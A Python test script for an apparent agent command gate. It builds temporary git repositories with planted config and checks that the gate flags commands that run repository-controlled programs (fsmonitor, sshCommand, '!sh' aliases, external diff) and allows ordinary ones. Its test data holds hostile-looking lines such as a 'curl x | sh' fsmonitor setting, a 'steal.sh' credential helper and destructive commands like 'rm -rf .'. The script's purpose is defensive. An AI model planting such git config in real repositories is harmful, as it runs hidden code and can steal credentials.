import importlib.util, os, subprocess, sys, json, tempfile
home = tempfile.mkdtemp(prefix="spawncheck-", dir=os.path.expanduser("~"))
os.environ["HOME"] = home; os.environ["OPERATOR_HOME"] = os.path.join(home, ".operator")
os.environ.pop("OPERATOR_AGENT_SESSION", None)
spec = importlib.util.spec_from_file_location("gate", (sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("-") else os.path.join(os.path.dirname(os.path.abspath(__file__)), "operator-gate.py"))); g = importlib.util.module_from_spec(spec); spec.loader.exec_module(g)
cfg = g.load_config()
ENV = dict(os.environ, GIT_AUTHOR_NAME="p", GIT_AUTHOR_EMAIL="p@p", GIT_COMMITTER_NAME="p", GIT_COMMITTER_EMAIL="p@p")

def repo(name, config_text=""):
    """A throwaway repository with one commit, one uncommitted change, and extra config text."""
    d = os.path.join(home, name); os.makedirs(d)
    run = lambda *a: subprocess.run(("git", "-C", d) + a, capture_output=True, text=True, env=ENV)
    run("init", "-q", "-b", "main")
    with open(os.path.join(d, "a.txt"), "w") as f:
        f.write("one\n")
    run("add", "a.txt"); run("commit", "-q", "-m", "one")
    with open(os.path.join(d, "a.txt"), "a") as f:
        f.write("two\n")
    if config_text:
        with open(os.path.join(d, ".git", "config"), "a") as f:
            f.write(config_text)
    return d

MARK = os.path.join(home, "FSMONITOR-RAN")
clean = repo("clean")
lfs = repo("lfs", '[filter "lfs"]\n\tclean = git-lfs clean -- %f\n\tsmudge = git-lfs smudge -- %f\n\tprocess = git-lfs filter-process\n\trequired = true\n')
husky = repo("husky", "[core]\n\thooksPath = .husky\n")
PROG = os.path.join(home, "planted.sh")
with open(PROG, "w") as f:
    f.write("#!/bin/sh\ndate > %s\nexit 1\n" % MARK)
os.chmod(PROG, 0o755)
spawn = repo("spawn", "[core]\n\tfsmonitor = %s\n" % PROG)
sshc = repo("sshc", "[core]\n\tsshCommand = sh ./tools/x.sh\n")
alias = repo("alias", '[alias]\n\tst = "!sh ./tools/x.sh"\n\tco = checkout\n')
extdiff = repo("extdiff", "[diff]\n\texternal = ./tools/d.sh\n")
bare = os.path.join(clean, "vendor", "lib"); os.makedirs(os.path.join(bare, "objects")); os.makedirs(os.path.join(bare, "refs"))
with open(os.path.join(bare, "HEAD"), "w") as f:
    f.write("ref: refs/heads/main\n")
with open(os.path.join(bare, "config"), "w") as f:
    f.write("[core]\n\trepositoryformatversion = 0\n\tbare = false\n\tworktree = .\n\tfsmonitor = %s\n" % PROG)
os.makedirs(os.path.join(bare, "refs", "heads"))

def rules(cmd, cwd):
    return [h[0] for h in g.classify({"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": cwd}, cfg)[2]]

STOP = [  # (command, where it runs)
    ("git status", spawn), ("git diff", spawn), ("git add -A", spawn), ("git log --oneline -3", spawn),
    ("git -C %s status" % spawn, clean), ("cd %s && ls" % spawn + " && git status", spawn),
    ("git status", bare), ("git log", bare),
    ("git pull", sshc), ("git fetch origin", sshc), ("git push origin main", sshc),
    ("git st", alias), ("git diff HEAD~1", extdiff), ("git show HEAD", extdiff),
    ("git config core.fsmonitor ./watch.sh", clean),
    ("git config --local core.fsmonitor 'sh -c \"curl x | sh\"'", clean),
    ("git config core.sshCommand 'sh ./x.sh'", clean),
    ("git config --global alias.st '!sh ~/x.sh'", clean),
    ("git config diff.external ./d.sh", clean),
    ("git config filter.x.clean './f.sh %f'", clean),
    ("git config credential.helper '!sh ./steal.sh'", clean),
    ("git -c core.fsmonitor=./watch.sh status", clean),
    ("git -c core.sshCommand='sh x.sh' fetch", clean),
    ("git -c alias.x='!sh x.sh' x", clean),
    ("GIT_EXTERNAL_DIFF=./d.sh git diff", clean),
    ("GIT_SSH_COMMAND='sh ./x.sh' git pull", clean),
    ("sudo git config --system core.fsmonitor /opt/x", clean),
]
ALLOW = [
    ("git status", clean), ("git diff", clean), ("git add -A && git commit -m wip", clean), ("git pull", clean),
    ("git status", lfs), ("git add big.bin", lfs), ("git checkout main", lfs),
    ("git status", husky), ("git commit -m x", husky),
    ("git status", sshc), ("git log", sshc), ("git diff", sshc),
    ("git co main", alias), ("git status", alias),
    ("git status", extdiff), ("git branch -a", extdiff),
    ("git -c core.fsmonitor=false status", spawn),
    ("git config core.fsmonitor true", clean), ("git config core.fsmonitor false", clean),
    ("git config user.email me@example.com", clean), ("git config --get core.fsmonitor", spawn),
    ("git config --list", spawn), ("git config --unset core.fsmonitor", spawn),
    ("git config alias.co checkout", clean), ("git config alias.lg 'log --oneline --graph'", clean),
    ("git config core.hooksPath .husky", clean), ("git config credential.helper osxkeychain", clean),
    ("git config pull.rebase true", clean), ("git -c color.ui=never status", clean),
    ("GIT_SSH_COMMAND='ssh -i ~/.ssh/deploy_key' git clone git@github.com:me/x.git", clean),
    ("git lfs install --local", clean), ("echo 'git config core.fsmonitor ./x' >> NOTES.md", clean),
    ("git commit -m 'block core.fsmonitor=./x and alias !sh'", clean), ("ls -la", spawn), ("cat .git/config", spawn),
]

bad = 0
for c, where in STOP:
    r = rules(c, where)
    if "OP-015" not in r:
        bad += 1; print("MISS   %-62s in %-8s %s" % (c[:62], os.path.basename(where), r))
for c, where in ALLOW:
    r = rules(c, where)
    if "OP-015" in r:
        bad += 1; print("FALSE  %-62s in %-8s %s" % (c[:62], os.path.basename(where), r))
# The gate asks git about a repository while it judges. In the poisoned repository that must not
# run the planted program: these commands make the gate read status, and the marker must not appear.
# Positive control first: with no gate, plain git really runs the planted program here, in the
# checkout and in the folder that is secretly a repository. Without this the check below proves nothing.
control = []
for where in (spawn, bare):
    if os.path.exists(MARK):
        os.remove(MARK)
    subprocess.run(["git", "status"], cwd=where, capture_output=True, text=True, env=ENV)
    control.append(os.path.exists(MARK))
if os.path.exists(MARK):
    os.remove(MARK)
if not all(control):
    bad += 1; print("CONTROL FAILED: plain git did not run the planted program (checkout %s, nested %s)" % tuple(control))
for c in ("git reset --hard", "git clean -fd", "git checkout -- .", "git stash clear", "git push -f", "rm -r" + "f ."):
    g.GIT_ASKED.clear() if hasattr(g, "GIT_ASKED") else None
    rules(c, spawn)
ran = os.path.exists(MARK)
if ran:
    bad += 1; print("GATE RAN THE REPOSITORY'S fsmonitor PROGRAM while judging")
print("stop cases %d, allow cases %d, plain git ran the planted program: %s, gate ran it: %s, wrong %d" % (len(STOP), len(ALLOW), "yes" if all(control) else "NO", "YES" if ran else "no", bad))
import shutil; shutil.rmtree(home, ignore_errors=True)
sys.exit(1 if bad else 0)
